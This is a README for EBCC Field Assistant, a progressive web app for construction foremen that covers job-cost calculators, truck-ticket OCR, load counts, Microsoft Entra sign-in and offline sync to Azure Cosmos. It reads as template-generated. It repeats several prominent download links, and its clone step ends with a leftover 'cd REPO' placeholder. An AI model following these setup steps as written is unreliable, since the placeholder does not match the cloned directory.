# EBCC Field Assistant - Field Operations PWA 2026

> **EBCC Field Assistant is a browser-based field operations PWA for foremen and construction crews, bringing together job cost calculations, truck ticket OCR, load monitoring, and synchronized records in the 2026 release.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/danielwestofh4362/ebcc-field-assistant-app?style=flat-square)](https://github.com/danielwestofh4362/ebcc-field-assistant-app)

---

<p align="center">
  <a href="https://danielwestofh4362.github.io/ebcc-field-assistant-app/">
    <img src="https://img.shields.io/badge/Download-EBCC%20Field%20Assistant%20Latest-brightgreen?style=for-the-badge" alt="Download EBCC Field Assistant">
  </a>
</p>

> **[Download EBCC Field Assistant](https://danielwestofh4362.github.io/ebcc-field-assistant-app/)**

---

[Download Latest Build](https://danielwestofh4362.github.io/ebcc-field-assistant-app/)

---

## What EBCC Field Assistant Does

EBCC Field Assistant gives foremen and construction crews a single installable progressive web app for routine field documentation and estimating work. It supports cost calculations, truck ticket handling, load recording, and extra work tracking from a browser-based interface.

The PWA is built for jobsites where internet service cannot always be relied upon. Information can remain available through local storage while the device is offline, then synchronize in the background with Azure Cosmos after connectivity returns. Microsoft Entra authentication and tenant-limited access support organization-based use, and authorized administrators can manage users and inspect records.

---

## Core Capabilities

- Estimate costs for per-yard work, flat work, lime trucks, flex base, and extra work.
- Process truck tickets through OCR using Claude vision.
- Maintain load counts and extra work ticket records.
- Install the tool as a progressive web app with offline support.
- Sign users in through Microsoft Entra with access limited to the configured tenant.
- Isolate records on a per-user basis.
- Send locally stored records to Azure Cosmos through background synchronization.
- Provide an administration area for user management and record review.

---

## Installation and Deployment

### Use the hosted application

To start using the current hosted build:

1. Go to [Download Latest Build](https://danielwestofh4362.github.io/ebcc-field-assistant-app/).
2. Sign in with an authorized Microsoft Entra account from the application's configured tenant.
3. If supported by the browser, choose the option to install the PWA on the device.
4. Launch the installed app and permit local storage so offline work can continue.

### Check out the project

```bash
git clone https://github.com/danielwestofh4362/ebcc-field-assistant-app.git
cd REPO
```

Run the project through a web server or publish it as a web application. Since EBCC Field Assistant is a PWA, use a supported browser to access the served application; do not open the HTML file directly from the filesystem.

The project profile identifies Azure Static Web Apps as the intended option for hosted deployments.

---

## Field Workflow

A standard session can follow these steps:

1. Launch EBCC Field Assistant and sign in with an approved Microsoft Entra account.
2. Choose the calculator that matches the work being assessed.
3. Provide the relevant quantities and job information.
4. Submit or capture a truck ticket for Claude vision OCR processing.
5. Review the recognized ticket data and verify it before saving.
6. Record changing load counts and extra work tickets throughout the job.
7. Continue entering records if the device loses connectivity.
8. When the connection returns, let background synchronization transfer local records to Azure Cosmos.
9. If authorized, use the administrative console to review records and manage accounts.

---

## Deployment Configuration

Configuration varies according to the hosting environment. Before users access a hosted instance, set up the required Microsoft Entra tenant permissions and Azure services.

Deployment settings generally cover:

- Microsoft Entra authentication and allowed tenant information.
- Azure Static Web Apps hosting configuration.
- Azure Cosmos synchronization configuration.
- Claude vision access for truck ticket OCR.
- Administrative permissions for managing users and reviewing records.

Store credentials and environment-specific values in protected hosting configuration. Do not commit those values to the repository.

---

## Requirements

- A current web browser that supports PWAs.
- Internet connectivity for authentication, the initial application load, OCR calls, and synchronization.
- An approved Microsoft Entra account belonging to the configured tenant.
- An Azure Static Web Apps deployment.
- Azure Cosmos access for synchronized records.
- Claude vision access for truck ticket OCR.
- Enabled browser local storage for offline use.
- Enough device storage for cached application content and locally held records.

---

## Frequently Asked Questions

### What teams use EBCC Field Assistant?

It is designed for foremen and construction field crews who need to calculate costs, handle truck tickets, track loads, and document extra work.

### Does the application work offline?

Yes. The PWA supports offline-capable operation by keeping records in local storage and synchronizing them in the background once the network is available again.

### What authentication is required?

The application uses Microsoft Entra sign-in and restricts access to the tenant configured for the deployment. Users must have an account in that tenant.

### Where does application data reside?

Records may be held in offline-safe local storage on the device and synchronized with Azure Cosmos.

### What is the truck ticket process?

Open the truck ticket workflow, submit the ticket image for OCR, inspect the extracted fields, and save the result after confirming the information is correct.

### What can I do when synchronization is delayed?

Check the device connection, verify that the user session remains active, and confirm that the deployment can access its configured Azure services. Keep the local copy until synchronization has completed.

### Who has access to administration tools?

Authorized administrators can use the administrative console to manage users and review records.

### How are new builds made available?

New versions are published through the hosted web application. After deployment, reload the site or close and reopen the installed PWA to receive the new build.

---

## Planned Improvements

- Further refine the field calculation experience.
- Continue improving ticket review and load-tracking processes.
- Broaden administrative record-review functions.
- Provide clearer synchronization status for offline records.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
